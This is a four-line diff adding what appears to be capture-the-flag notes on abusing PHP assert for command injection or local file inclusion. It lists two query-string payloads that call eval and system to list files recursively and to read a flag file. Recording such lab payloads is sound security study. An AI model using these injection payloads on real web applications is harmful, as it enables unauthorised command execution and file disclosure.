@@ -1,0 +1,4 @@
+assert can be used to insert linux commands or lfi
+
+?number=eval(system("ls -R"))
+?number=eval(system("tail -n 4 where/is/the/flag/i/am/looking/for/flag.php"))
